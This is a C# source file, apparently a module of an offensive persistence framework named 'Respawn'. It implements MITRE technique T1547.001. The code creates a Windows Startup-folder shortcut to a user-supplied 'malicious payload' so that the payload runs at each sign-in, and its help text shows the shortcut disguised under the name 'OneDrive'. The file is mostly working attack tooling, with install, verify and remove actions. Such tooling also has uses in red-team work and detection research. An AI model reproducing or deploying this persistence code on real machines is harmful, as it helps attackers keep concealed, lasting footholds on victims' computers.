using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using IWshRuntimeLibrary;

namespace Respawn.Techniques.Startup
{
    public class StartupModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "startup";
        public string Name        => "Startup Folder";
        public string Mitre       => "T1547.001";
        public string Description => "Persist by dropping a .lnk shortcut pointing to a malicious payload into the designated Windows Startup folder, ensuring the OS automatically executes the payload when the user signs in.";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "folders");

            // 2. FOLDER CONTEXT
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  FOLDER CONTEXT:");
            // Console.ResetColor();
            // Console.WriteLine("    - 'user'   : Current user only (No Admin Required)");
            // Console.WriteLine("    - 'system' : All users on machine (Requires Admin)");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-f,  --folder", "Target folder ID (user, system)");
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Shortcut filename (without .lnk)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the target executable");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t startup -a list-folders");
            TechniqueHelpBuilder.RenderExample("Respawn -t startup -a install -f \"user\" -n \"OneDrive\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t startup -a verify  -f \"user\" -n \"OneDrive\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t startup -a remove  -f \"user\" -n \"OneDrive\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("folders", StringComparison.OrdinalIgnoreCase))
                return StartupFolders.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var folder = StartupFolders.GetById(ctx.Folder);
            if (folder == null)
                return TechniqueResult.Fail($"Unknown folder id '{ctx.Folder}'. Use -a list-folders to see available folders.");

            try
            {
                string lnkPath = BuildLnkPath(folder.Path, ctx.Name);

                if (System.IO.File.Exists(lnkPath))
                    return TechniqueResult.Exists($"Shortcut '{ctx.Name}.lnk' already exists in {folder.Path}");

                CreateShortcut(lnkPath, ctx.Payload);
                return TechniqueResult.Ok($"Installed '{ctx.Name}.lnk' -> '{ctx.Payload}' in {folder.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Folder '{ctx.Folder}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var folder = StartupFolders.GetById(ctx.Folder);
            if (folder == null)
                return TechniqueResult.Fail($"Unknown folder id '{ctx.Folder}'. Use -a list-folders to see available folders.");

            try
            {
                string lnkPath = BuildLnkPath(folder.Path, ctx.Name);

                if (!System.IO.File.Exists(lnkPath))
                    return TechniqueResult.NotFound($"Shortcut '{ctx.Name}.lnk' not found in {folder.Path}");

                System.IO.File.Delete(lnkPath);
                return TechniqueResult.Ok($"Removed '{ctx.Name}.lnk' from {folder.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Folder '{ctx.Folder}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var folder = StartupFolders.GetById(ctx.Folder);
            if (folder == null)
                return TechniqueResult.Fail($"Unknown folder id '{ctx.Folder}'. Use -a list-folders to see available folders.");

            try
            {
                string lnkPath = BuildLnkPath(folder.Path, ctx.Name);

                if (!System.IO.File.Exists(lnkPath))
                    return TechniqueResult.NotFound($"Shortcut '{ctx.Name}.lnk' not found in {folder.Path}");

                string target = ResolveShortcutTarget(lnkPath);
                return TechniqueResult.Ok($"Verified '{ctx.Name}.lnk' -> '{target}' in {folder.Path}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied. Folder '{ctx.Folder}' requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Folder))
            {
                error = "No folder specified. Use -f <folder-id> or see -a list-folders.";
                return false;
            }
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            error = string.Empty;
            return true;
        }

        private string BuildLnkPath(string folderPath, string name) =>
            Path.Combine(folderPath, $"{name}.lnk");

        private void CreateShortcut(string lnkPath, string targetExe)
        {
            WshShell shell    = new WshShell();
            IWshShortcut link = (IWshShortcut)shell.CreateShortcut(lnkPath);
            link.TargetPath       = targetExe;
            link.WorkingDirectory = Path.GetDirectoryName(targetExe) ?? string.Empty;
            link.WindowStyle      = 1;
            link.Save();
        }

        private string ResolveShortcutTarget(string lnkPath)
        {
            WshShell shell    = new WshShell();
            IWshShortcut link = (IWshShortcut)shell.CreateShortcut(lnkPath);
            return link.TargetPath;
        }
    }
}